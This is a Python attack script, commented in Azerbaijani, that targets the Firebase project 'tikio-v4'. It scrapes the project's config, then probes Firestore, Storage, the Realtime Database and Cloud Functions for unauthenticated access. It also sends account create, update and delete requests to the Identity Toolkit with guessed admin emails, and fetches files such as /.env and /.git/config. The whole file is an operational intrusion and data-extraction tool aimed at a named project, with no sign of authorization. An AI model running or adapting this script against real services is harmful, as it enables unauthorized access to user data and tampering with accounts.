#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 FIREBASE DEEP ATTACK SCRIPT
Bu script Firebase-ə daha dərindən hücum edir və data extract edir
"""

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse
import urllib3
import base64

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FirebaseDeepAttacker:
    def __init__(self, project_id="tikio-v4"):
        self.project_id = project_id
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
    def extract_firebase_config(self):
        """Firebase konfiqurasiya məlumatlarını extract edir"""
        print("🔍 Firebase konfiqurasiya məlumatları extract edilir...")
        
        hosting_urls = [
            f"https://{self.project_id}.web.app",
            f"https://{self.project_id}.firebaseapp.com",
        ]
        
        config_data = {}
        
        for url in hosting_urls:
            try:
                response = self.session.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Firebase config patterns
                    patterns = {
                        'apiKey': r'apiKey["\']?\s*:\s*["\']([^"\']+)["\']',
                        'authDomain': r'authDomain["\']?\s*:\s*["\']([^"\']+)["\']',
                        'projectId': r'projectId["\']?\s*:\s*["\']([^"\']+)["\']',
                        'storageBucket': r'storageBucket["\']?\s*:\s*["\']([^"\']+)["\']',
                        'messagingSenderId': r'messagingSenderId["\']?\s*:\s*["\']([^"\']+)["\']',
                        'appId': r'appId["\']?\s*:\s*["\']([^"\']+)["\']',
                        'databaseURL': r'databaseURL["\']?\s*:\s*["\']([^"\']+)["\']',
                    }
                    
                    for key, pattern in patterns.items():
                        match = re.search(pattern, content)
                        if match:
                            config_data[key] = match.group(1)
                            print(f"   ✅ {key}: {match.group(1)}")
                            
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return config_data
        
    def test_firebase_rules_bypass(self):
        """Firebase Security Rules bypass test edir"""
        print("\n🚨 Firebase Security Rules bypass test edilir...")
        
        # Firestore rules test
        firestore_urls = [
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/posts",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/settings",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/admin",
        ]
        
        bypass_vulnerabilities = []
        
        for url in firestore_urls:
            try:
                # GET request
                response = self.session.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {url} - GET access mümkün!")
                    bypass_vulnerabilities.append(f"GET:{url}")
                    
                    # Data content yoxla
                    try:
                        data = response.json()
                        if 'documents' in data:
                            print(f"      📊 Tapılan documents: {len(data['documents'])}")
                    except:
                        pass
                        
                # POST request test
                test_data = {"test": "data"}
                response = self.session.post(url, json=test_data, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {url} - POST access mümkün!")
                    bypass_vulnerabilities.append(f"POST:{url}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return bypass_vulnerabilities
        
    def test_firebase_storage_bypass(self):
        """Firebase Storage bypass test edir"""
        print("\n💾 Firebase Storage bypass test edilir...")
        
        storage_patterns = [
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/users",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/images",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/documents",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/backups",
        ]
        
        storage_vulnerabilities = []
        
        for url in storage_patterns:
            try:
                response = self.session.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {url} - Storage access mümkün!")
                    storage_vulnerabilities.append(url)
                    
                    # Files list yoxla
                    try:
                        data = response.json()
                        if 'items' in data:
                            print(f"      📁 Tapılan files: {len(data['items'])}")
                            for item in data['items'][:5]:  # İlk 5 file
                                print(f"         • {item.get('name', 'Unknown')}")
                    except:
                        pass
                        
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return storage_vulnerabilities
        
    def test_firebase_auth_bypass(self):
        """Firebase Authentication bypass test edir"""
        print("\n🔐 Firebase Authentication bypass test edir...")
        
        auth_endpoints = [
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:lookup",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:query",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:batchGet",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:create",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:update",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:delete",
        ]
        
        auth_vulnerabilities = []
        
        for endpoint in auth_endpoints:
            try:
                # Test data
                test_data = {
                    "localId": ["test_user", "admin", "user123"],
                    "email": ["test@example.com", "admin@tikio.com", "user@tikio.com"],
                    "phoneNumber": ["+1234567890", "+9876543210"],
                    "password": "test123",
                    "displayName": "Test User"
                }
                
                # POST request
                response = self.session.post(endpoint, json=test_data, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {endpoint} - Auth bypass mümkün!")
                    auth_vulnerabilities.append(endpoint)
                    
                    # Response data yoxla
                    try:
                        data = response.json()
                        if 'users' in data:
                            print(f"      👥 Tapılan users: {len(data['users'])}")
                        elif 'localId' in data:
                            print(f"      ✅ User created/updated: {data['localId']}")
                    except:
                        pass
                        
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return auth_vulnerabilities
        
    def test_firebase_realtime_db_bypass(self):
        """Firebase Realtime Database bypass test edir"""
        print("\n⚡ Firebase Realtime Database bypass test edir...")
        
        rtdb_patterns = [
            f"https://{self.project_id}-default-rtdb.firebaseio.com",
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app",
            f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app",
        ]
        
        rtdb_vulnerabilities = []
        
        for base_url in rtdb_patterns:
            try:
                # Test paths
                test_paths = [
                    "/.json",
                    "/users/.json",
                    "/posts/.json",
                    "/settings/.json",
                    "/admin/.json",
                    "/config/.json",
                    "/data/.json",
                ]
                
                for path in test_paths:
                    url = base_url + path
                    response = self.session.get(url, verify=False, timeout=10)
                    
                    if response.status_code == 200:
                        print(f"   ⚠️ VULNERABILITY: {url} - Database access mümkün!")
                        rtdb_vulnerabilities.append(url)
                        
                        # Data content yoxla
                        try:
                            data = response.json()
                            if isinstance(data, dict):
                                print(f"      📊 Keys: {list(data.keys())}")
                            elif isinstance(data, list):
                                print(f"      📊 Array length: {len(data)}")
                        except:
                            pass
                            
            except Exception as e:
                print(f"   ❌ Xəta: {base_url} - {e}")
                
        return rtdb_vulnerabilities
        
    def test_firebase_functions_bypass(self):
        """Firebase Functions bypass test edir"""
        print("\n⚡ Firebase Functions bypass test edir...")
        
        function_regions = [
            "us-central1", "europe-west1", "asia-east1", "asia-southeast1",
            "europe-west2", "us-east1", "us-west1", "us-west2"
        ]
        
        function_vulnerabilities = []
        
        for region in function_regions:
            base_url = f"https://{region}-{self.project_id}.cloudfunctions.net"
            
            try:
                response = self.session.get(base_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {base_url} - Functions access mümkün!")
                    function_vulnerabilities.append(base_url)
                    
                    # Common function names test
                    common_functions = [
                        "api", "webhook", "auth", "user", "post", "upload",
                        "download", "process", "validate", "send", "receive"
                    ]
                    
                    for func in common_functions:
                        func_url = f"{base_url}/{func}"
                        try:
                            func_response = self.session.get(func_url, verify=False, timeout=5)
                            if func_response.status_code == 200:
                                print(f"      🔧 Function found: {func}")
                        except:
                            pass
                            
            except Exception as e:
                continue
                
        return function_vulnerabilities
        
    def test_firebase_hosting_deep(self):
        """Firebase Hosting deep scan"""
        print("\n🌐 Firebase Hosting deep scan edilir...")
        
        hosting_urls = [
            f"https://{self.project_id}.web.app",
            f"https://{self.project_id}.firebaseapp.com",
        ]
        
        hosting_vulnerabilities = []
        
        for base_url in hosting_urls:
            try:
                # Common sensitive files
                sensitive_files = [
                    "/.env", "/config.js", "/firebase.js", "/api.js",
                    "/admin", "/dashboard", "/panel", "/console",
                    "/.git/config", "/.htaccess", "/robots.txt",
                    "/sitemap.xml", "/manifest.json", "/sw.js"
                ]
                
                for file_path in sensitive_files:
                    url = base_url + file_path
                    try:
                        response = self.session.get(url, verify=False, timeout=5)
                        
                        if response.status_code == 200:
                            print(f"   ⚠️ SENSITIVE FILE: {url}")
                            hosting_vulnerabilities.append(url)
                            
                            # Content preview
                            content = response.text[:200]
                            print(f"      📄 Content: {content}...")
                            
                    except:
                        pass
                        
            except Exception as e:
                print(f"   ❌ Xəta: {base_url} - {e}")
                
        return hosting_vulnerabilities
        
    def generate_deep_attack_report(self, results):
        """Deep attack hesabatı yaradır"""
        print("\n" + "="*80)
        print("🔥 FIREBASE DEEP ATTACK HESABATI")
        print("="*80)
        
        total_vulnerabilities = 0
        
        for category, vulns in results.items():
            if vulns:
                print(f"\n📂 {category.upper()}:")
                for vuln in vulns:
                    print(f"   ⚠️ {vuln}")
                    total_vulnerabilities += 1
            else:
                print(f"\n📂 {category.upper()}: ✅ Təhlükəsiz")
                
        print(f"\n🎯 ÜMUMİ VULNERABILITY-LƏR: {total_vulnerabilities}")
        
        if total_vulnerabilities > 0:
            print("\n🚨 KRİTİK TƏHLÜKƏSİZLİK XƏBƏRDARLIĞI:")
            print("   • Firebase project-də kritik təhlükəsizlik açıqları var!")
            print("   • Dərhal təhlükəsizlik tədbirləri görülməlidir!")
            print("   • Bütün endpoint-lər yoxlanılmalıdır!")
            print("   • Security rules yenidən konfiqurasiya edilməlidir!")
            
            print("\n💡 TÖVSİYƏ OLUNAN TƏDBİRLƏR:")
            print("   • Firebase Security Rules yoxlanılmalıdır")
            print("   • Authentication tələb olunmalıdır")
            print("   • Sensitive data public olmamalıdır")
            print("   • API keys və secrets yoxlanılmalıdır")
        else:
            print("\n✅ TƏHLÜKƏSİZLİK STATUSU:")
            print("   • Firebase project tam təhlükəsizdir")
            print("   • Bütün endpoint-lər düzgün qorunur")
            print("   • Security rules düzgün konfiqurasiya edilib")
            
        return total_vulnerabilities
        
    def run_deep_attacks(self):
        """Bütün deep hücumları işə salır"""
        print("🚀 FIREBASE DEEP ATTACK BAŞLAYIR...")
        print("="*70)
        
        # Firebase config extract
        config_data = self.extract_firebase_config()
        
        if config_data:
            print(f"\n📋 FIREBASE CONFIG:")
            for key, value in config_data.items():
                print(f"   {key}: {value}")
        
        # Bütün deep hücumları test et
        results = {
            "Security Rules Bypass": self.test_firebase_rules_bypass(),
            "Storage Bypass": self.test_firebase_storage_bypass(),
            "Authentication Bypass": self.test_firebase_auth_bypass(),
            "Realtime Database Bypass": self.test_firebase_realtime_db_bypass(),
            "Functions Bypass": self.test_firebase_functions_bypass(),
            "Hosting Deep Scan": self.test_firebase_hosting_deep(),
        }
        
        # Hesabat yarat
        total_vulns = self.generate_deep_attack_report(results)
        
        print(f"\n🎯 DEEP ATTACK TAMAMLANDI! Tapılan vulnerability-lər: {total_vulns}")
        
        return results

if __name__ == "__main__":
    # Firebase project ID
    project_id = "tikio-v4"
    
    # Deep hücum başlat
    attacker = FirebaseDeepAttacker(project_id)
    results = attacker.run_deep_attacks()